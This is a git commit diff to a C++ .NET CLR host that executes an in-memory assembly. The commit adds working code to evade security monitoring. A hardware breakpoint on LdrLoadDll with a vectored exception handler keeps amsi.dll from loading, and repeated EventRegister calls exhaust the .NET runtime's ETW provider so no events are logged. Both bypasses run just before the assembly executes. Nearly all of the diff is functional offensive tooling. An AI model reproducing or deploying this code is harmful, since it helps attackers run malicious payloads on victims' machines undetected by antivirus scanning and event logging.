9fe5208d6329389fb70c4156243a4a9c45f7cb37
unknown <6915160+Acebond@users.noreply.github.com>
2025-05-02 15:47:42 +1000

    added AMSI/ETW blocks

--- CLRHost.cpp
+++ CLRHost.cpp
@@ -1,24 +1,32 @@
 #include <Windows.h>
+#include <winternl.h>
+#include <evntprov.h>
 #include <metahost.h>
 #include <wrl/client.h>
-
 #include <cstdio>
 
 #pragma comment(lib, "MSCorEE.lib")
-
-#define ArraySize(x) (sizeof x / sizeof x[0])
-
-#define CHECK_HRESULT(hrcall) \
-    if (HRESULT hr = hrcall; FAILED(hr)) { \
-        printf("ERROR: %s failed w/hr 0x%08lx\n", #hrcall, hr); \
-        return 1; \
-    }
 
 // Import mscorlib.tlb (Microsoft Common Language Runtime Class Library)
 #import <mscorlib.tlb> raw_interfaces_only					\
 	high_property_prefixes("_get","_put","_putref")			\
 	rename("ReportEvent", "InteropServices_ReportEvent")	\
 	rename("or", "InteropServices_or")
+
+#define ArraySize(x) (sizeof x / sizeof x[0])
+
+#define CHECK_HRESULT(hrcall) \
+    if (HRESULT hr = hrcall; FAILED(hr)) {                      \
+        printf("ERROR: %s failed w/hr 0x%08lx\n", #hrcall, hr); \
+        return 1; }
+
+typedef NTSTATUS(NTAPI* LdrLoadDll)(
+    IN  PWCHAR          PathToFile OPTIONAL,
+    IN  ULONG           Flags OPTIONAL,
+    IN  PUNICODE_STRING ModuleFileName,
+    OUT PHANDLE         ModuleHandle);
+
+LdrLoadDll fnLdrLoadDll = NULL;
 
 int ExecuteAssembly(SAFEARRAY* rawAssembly, SAFEARRAY* parameters, LPCWCHAR appDomainName) {
 
@@ -40,7 +48,7 @@ int ExecuteAssembly(SAFEARRAY* rawAssembly, SAFEARRAY* parameters, LPCWCHAR appD
     CHECK_HRESULT(pMetaHost->EnumerateLoadedRuntimes(GetCurrentProcess(), &pRuntimeEnum));
 
     // Check if CLR is already loaded.
-    BOOL    bCLRLoaded         = FALSE;
+    BOOL    bCLRLoaded        = FALSE;
     LPCWSTR sz_runtimeVersion = L"v4.0.30319";
     WCHAR   wszVersion[64]    = { 0 };
     DWORD   cchVersion        = ArraySize(wszVersion);
@@ -99,6 +107,78 @@ int ExecuteAssembly(SAFEARRAY* rawAssembly, SAFEARRAY* parameters, LPCWCHAR appD
     return 0;
 }
 
+LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {
+
+    PCWCHAR blockedDLLs[] = {
+        L"amsi.dll",
+        L"lolz.dll",
+    };
+
+    // Check if this is a single-step exception caused by a hardware breakpoint
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        // Check if the breakpoint was hit for LdrLoadDll
+        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == fnLdrLoadDll) {
+            // x64 calling convention, 3rd parameter is in R8
+            PUNICODE_STRING moduleName = (PUNICODE_STRING)ExceptionInfo->ContextRecord->R8;
+            if (moduleName && moduleName->Buffer) {
+                for (DWORD i = 0; i < ArraySize(blockedDLLs); i++) {
+                    // Performs a case-insensitive comparison of strings
+                    if (_wcsicmp(moduleName->Buffer, blockedDLLs[i]) == 0) {
+                        // we dont want to load it, so simulate a ret
+                        ExceptionInfo->ContextRecord->Rip = *(ULONG_PTR*)ExceptionInfo->ContextRecord->Rsp;
+                        ExceptionInfo->ContextRecord->Rsp += sizeof(PVOID);
+                        ExceptionInfo->ContextRecord->Rax = STATUS_DLL_NOT_FOUND;
+                        wprintf(L"BLOCKED: %wZ\n", moduleName);
+                        break;
+                    }
+                }
+            }
+
+            // Set the resume flag before continuing execution
+            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+BOOL EnableBreakpoint(HANDLE hThread, const PVOID address) {
+
+    CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
+
+    if (!GetThreadContext(hThread, &context)) {
+        return FALSE;
+    }
+
+    context.Dr0 = (DWORD_PTR)address;
+    context.Dr7 |= 1;  // Enable the breakpoint for execution on DR0
+
+    // Set the thread context with the updated debug registers
+    if (!SetThreadContext(hThread, &context)) {
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL BlockAMSI(void) {
+    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
+    if (!ntdll) return FALSE;
+
+    fnLdrLoadDll = (LdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
+    if (!fnLdrLoadDll) return FALSE;
+
+    HANDLE hExHandler = AddVectoredExceptionHandler(1, ExceptionHandler);
+    return EnableBreakpoint(GetCurrentThread(), fnLdrLoadDll);
+}
+
+void BlockETW() {
+    REGHANDLE RegistrationHandle = NULL;
+    const GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} }; //.NET Common Language Runtime
+    while (EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {}
+}
+
 int wmain(int argc, wchar_t** argv) {
 
     if (argc < 2) {
@@ -148,6 +228,9 @@ int wmain(int argc, wchar_t** argv) {
     SAFEARRAY* params = SafeArrayCreateVector(VT_VARIANT, 0, 1);
     LONG idx = 0;
     SafeArrayPutElement(params, &idx, &vtPsa);
+
+    BlockAMSI();
+    BlockETW();
 
     ExecuteAssembly(pSafeArray, params, appDomainName);
     return 0;
